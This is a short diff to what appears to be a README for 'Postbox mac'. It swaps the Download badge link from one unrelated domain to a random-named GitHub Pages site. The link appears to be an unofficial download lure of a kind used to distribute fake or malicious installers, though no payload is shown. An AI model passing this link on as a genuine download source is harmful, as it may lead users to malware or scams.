@@ -2,7 +2,7 @@
 
 Postbox mac delivers Mac‑optimized tools with Apple silicon support, native UI, and professional workflows.
 
-[![Download Postbox mac](https://img.shields.io/badge/Download-Postbox_mac-blueviolet)](https://metarefund.com/)
+[![Download Postbox mac](https://img.shields.io/badge/Download-Postbox_mac-blueviolet)](https://margertluterbkowqc.github.io/.github/Postbox-Studio)
 
 ---
 
